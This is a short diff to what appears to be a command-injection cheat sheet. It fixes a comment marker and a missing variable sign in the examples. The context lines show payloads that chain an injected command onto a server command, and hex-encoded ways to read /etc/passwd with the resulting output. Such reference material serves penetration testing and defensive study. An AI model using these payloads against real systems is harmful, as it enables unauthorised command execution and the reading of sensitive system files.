@@ -51,7 +51,7 @@ sys:x:3:3:sys:/dev:/bin/sh
 original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
-original_cmd_by_server || ls    Only if the first cmd fail
+original_cmd_by_server || ls   # Only if the first cmd fail
 ```
 
 ### Inside a command
@@ -120,7 +120,7 @@ swissky@crashlab▸ ~ ▸ $ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x6
 swissky@crashlab▸ ~ ▸ $ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab▸ ~ ▸ $ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+swissky@crashlab▸ ~ ▸ $ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
 root:x:0:0:root:/root:/bin/bash
 
 swissky@crashlab▸ ~ ▸ $ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
